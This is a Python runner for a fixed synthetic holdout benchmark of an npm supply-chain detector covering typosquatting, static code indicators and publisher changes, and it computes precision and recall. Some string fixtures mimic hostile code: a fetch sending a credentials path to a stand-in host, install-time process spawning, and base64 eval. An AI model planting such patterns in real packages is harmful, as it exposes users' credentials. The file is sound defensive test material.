"""Fixed offline holdout evaluation for Phase 3.

The labels were selected before executing this runner and are not used to tune detector
thresholds. Positive means "warrants investigation", not confirmed malware. All source
snippets and identities are synthetic, and no source is executed.
"""

from __future__ import annotations

import argparse
import json
from dataclasses import asdict, dataclass
from datetime import datetime, timezone

from app.detection.rules import correlate_publisher_risk, detect_install_script_changes, detect_publisher_changes
from app.detection.static_analysis import InspectedFile, StaticInspection, findings_for_inspection, scan_source_indicators
from app.detection.typosquatting import detect_typosquatting
from app.models.schemas import GraphNode, RegistryMetadataResponse, ScanGraph


OBSERVED_AT = datetime(2026, 2, 1, tzinfo=timezone.utc)
GROUND_TRUTH = (
    "Positive means the fixed synthetic scenario warrants security investigation; it does not mean the package is "
    "confirmed malware, compromised, or exploitable."
)
LIMITATION = (
    "This fixed holdout is independent from the original 16-case Phase 2 benchmark and uses different examples, "
    "but it remains a small synthetic indicator corpus rather than a representative npm ecosystem sample."
)


@dataclass(frozen=True)
class HoldoutCase:
    case_id: str
    category: str
    expected_investigation: bool
    predicted_investigation: bool
    rationale: str


@dataclass(frozen=True)
class HoldoutMetrics:
    true_positives: int
    false_positives: int
    true_negatives: int
    false_negatives: int
    precision: float
    recall: float
    f1_score: float
    false_positive_rate: float


@dataclass(frozen=True)
class HoldoutReport:
    benchmark: str
    evaluated_cases: int
    positive_class: str
    methodology: str
    limitation: str
    metrics: HoldoutMetrics
    cases: tuple[HoldoutCase, ...]

    def as_dict(self) -> dict:
        return asdict(self)


def run_holdout() -> HoldoutReport:
    cases = (
        _typo("near-miss-react-substitution", "reakt", ("react",), True),
        _typo("near-miss-axios-transposition", "axois", ("axios",), True),
        _typo("legitimate-react-companion", "react-dom", ("react",), False),
        _typo("scoped-angular-transposition", "@angular/croe", ("@angular/core",), True),
        _typo("different-scope-same-leaf", "@example/core", ("@angular/core",), False),
        _typo("legitimate-prettier-plugin", "prettier-plugin-acme", ("prettier",), False),
        _static(
            "install-process-network-combination",
            "const cp=require('child_process'); cp.spawn('printf',['demo']); fetch('https://telemetry.invalid.test');",
            install_reachable=True,
            expected=True,
            rationale="Install-reachable process and network indicators warrant source review.",
        ),
        _static(
            "credential-file-network-combination",
            "const p='.aws/credentials'; fetch('https://audit.invalid.test/?p='+p);",
            install_reachable=False,
            expected=True,
            rationale="Credential-path and network indicators in one file warrant investigation.",
        ),
        _static(
            "dynamic-obfuscation-combination",
            "const value=Buffer.from('ZGVtby1vbmx5','base64'); eval(value);",
            install_reachable=False,
            expected=True,
            rationale="Dynamic evaluation combined with encoded content warrants investigation.",
        ),
        _static(
            "credential-reference-only",
            "const path = '.config/gcloud/application_default_credentials.json';",
            install_reachable=False,
            expected=True,
            rationale="A credential-location reference is ambiguous but worth low-priority review.",
        ),
        _static(
            "dynamic-loader-only",
            "const moduleName = process.argv[2]; require(moduleName);",
            install_reachable=False,
            expected=True,
            rationale="A dynamic module load is ambiguous but worth investigation.",
        ),
        _static(
            "telemetry-network-only",
            "fetch('https://metrics.invalid.test/v1/build');",
            install_reachable=False,
            expected=False,
            rationale="A network call alone is insufficient under the current correlation policy.",
        ),
        _static(
            "noninstall-tool-version-check",
            "require('child_process').exec('tool --version');",
            install_reachable=False,
            expected=False,
            rationale="Non-install process use alone is a near miss, not an investigation label.",
        ),
        _static(
            "legitimate-install-file-copy",
            "require('fs').copyFileSync('template.json', 'dist/template.json');",
            install_reachable=True,
            expected=False,
            rationale="A local build-file copy is a legitimate install action.",
        ),
        _static(
            "legitimate-native-build-script",
            "require('child_process').spawnSync('node-gyp', ['rebuild']);",
            install_reachable=True,
            expected=False,
            rationale="A conventional native build command is legitimate in this labeled fixture.",
        ),
        _static(
            "encoded-data-without-execution",
            "const icon = Buffer.from('aWNvbi1kYXRh', 'base64');",
            install_reachable=False,
            expected=False,
            rationale="Small encoded static data without dynamic execution is a difficult benign case.",
        ),
        _publisher("authorized-owner-transition", "maintainer-a", "maintainer-b", (), (), True),
        _publisher("stable-release-owner", "maintainer-a", "maintainer-a", (), (), False),
        _publisher("missing-publisher-snapshots", None, None, None, None, False),
        _publisher(
            "owner-transition-with-install-change",
            "maintainer-a",
            "maintainer-c",
            (),
            ("postinstall",),
            True,
            correlated=True,
        ),
    )
    return HoldoutReport(
        benchmark="provenyx-phase3-fixed-synthetic-holdout-v1",
        evaluated_cases=len(cases),
        positive_class=GROUND_TRUTH,
        methodology=(
            "Twenty fixed, offline synthetic cases not copied from the Phase 2 case list. Detector thresholds are "
            "the production defaults and were not changed after observing these results."
        ),
        limitation=LIMITATION,
        metrics=_metrics(cases),
        cases=cases,
    )


def render_markdown(report: HoldoutReport) -> str:
    metrics = report.metrics
    lines = [
        "# Provenyx Phase 3 fixed holdout benchmark",
        "",
        report.positive_class,
        "",
        report.methodology,
        "",
        f"> Limitation: {report.limitation}",
        "",
        f"Exact evaluated cases: **{report.evaluated_cases}**",
        "",
        "## Metrics",
        "",
        "| TP | FP | TN | FN | Precision | Recall | F1 | False-positive rate |",
        "|---:|---:|---:|---:|---:|---:|---:|---:|",
        (
            f"| {metrics.true_positives} | {metrics.false_positives} | {metrics.true_negatives} | "
            f"{metrics.false_negatives} | {metrics.precision:.3f} | {metrics.recall:.3f} | "
            f"{metrics.f1_score:.3f} | {metrics.false_positive_rate:.3f} |"
        ),
        "",
        "## Cases",
        "",
        "| Case | Category | Expected | Predicted | Result |",
        "|---|---|---:|---:|---|",
    ]
    for case in report.cases:
        lines.append(
            f"| `{case.case_id}` | {case.category} | {str(case.expected_investigation).lower()} | "
            f"{str(case.predicted_investigation).lower()} | {_classification(case)} |"
        )
    return "\n".join(lines) + "\n"


def _typo(case_id: str, package: str, trusted: tuple[str, ...], expected: bool) -> HoldoutCase:
    node = _node(package, "7.3.1", direct=True)
    actual = bool(
        detect_typosquatting(
            _graph(node), candidate_ids={node.id}, observed_at=OBSERVED_AT, trusted_packages=trusted
        )
    )
    return HoldoutCase(case_id, "package-name", expected, actual, "Synthetic name near-miss with fixed label.")


def _static(
    case_id: str,
    source: str,
    *,
    install_reachable: bool,
    expected: bool,
    rationale: str,
) -> HoldoutCase:
    node = _node("holdout-artifact", "3.2.1", direct=True)
    inspected = InspectedFile(
        path="package/setup.js" if install_reachable else "package/runtime.js",
        install_reachable=install_reachable,
        indicators=tuple(scan_source_indicators("package/fixture.js", source)),
    )
    inspection = StaticInspection(identity="sha512-phase3-holdout", verified=True, files=(inspected,))
    actual = bool(findings_for_inspection(_graph(node), node, inspection, OBSERVED_AT))
    return HoldoutCase(case_id, "static-indicator", expected, actual, rationale)


def _publisher(
    case_id: str,
    old_publisher: str | None,
    new_publisher: str | None,
    old_scripts: tuple[str, ...] | None,
    new_scripts: tuple[str, ...] | None,
    expected: bool,
    *,
    correlated: bool = False,
) -> HoldoutCase:
    baseline = _graph(_node("holdout-publisher", "4.0.0", True, old_publisher, old_scripts))
    current = _graph(_node("holdout-publisher", "4.1.0", True, new_publisher, new_scripts))
    findings = detect_publisher_changes(baseline, current, observed_at=OBSERVED_AT)
    if correlated:
        findings.extend(detect_install_script_changes(baseline, current, observed_at=OBSERVED_AT))
        findings = correlate_publisher_risk(findings, observed_at=OBSERVED_AT)
    actual = any(finding.rule_id == "publisher-change" for finding in findings)
    rationale = (
        "A publisher transition can be authorized and still warrants verification; the label is investigation, not malware."
        if expected
        else "No reliable release-specific identity change is present."
    )
    return HoldoutCase(case_id, "publisher-snapshot", expected, actual, rationale)


def _node(
    name: str,
    version: str,
    direct: bool,
    publisher: str | None = "fixture-owner",
    scripts: tuple[str, ...] | None = (),
) -> GraphNode:
    registry = (
        RegistryMetadataResponse(
            status="available",
            publisher=publisher,
            install_scripts=list(scripts) if scripts is not None else None,
            maintainers=[publisher] if publisher else None,
        )
        if publisher is not None or scripts is not None
        else RegistryMetadataResponse(status="unavailable", error="missing holdout metadata")
    )
    return GraphNode(
        id=f"{name}@{version}",
        name=name,
        version=version,
        direct=direct,
        lockfile_paths=[f"node_modules/{name}"],
        registry=registry,
    )


def _graph(*nodes: GraphNode) -> ScanGraph:
    return ScanGraph(scan_id="phase3-holdout", status="complete", nodes=list(nodes))


def _metrics(cases: tuple[HoldoutCase, ...]) -> HoldoutMetrics:
    tp = sum(case.expected_investigation and case.predicted_investigation for case in cases)
    fp = sum(not case.expected_investigation and case.predicted_investigation for case in cases)
    tn = sum(not case.expected_investigation and not case.predicted_investigation for case in cases)
    fn = sum(case.expected_investigation and not case.predicted_investigation for case in cases)
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0
    fpr = fp / (fp + tn) if fp + tn else 0.0
    return HoldoutMetrics(tp, fp, tn, fn, precision, recall, f1, fpr)


def _classification(case: HoldoutCase) -> str:
    if case.expected_investigation:
        return "TP" if case.predicted_investigation else "FN"
    return "FP" if case.predicted_investigation else "TN"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run the fixed offline Phase 3 holdout benchmark")
    parser.add_argument("--format", choices=("json", "markdown"), default="markdown")
    args = parser.parse_args(argv)
    report = run_holdout()
    print(json.dumps(report.as_dict(), indent=2, sort_keys=True) if args.format == "json" else render_markdown(report), end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
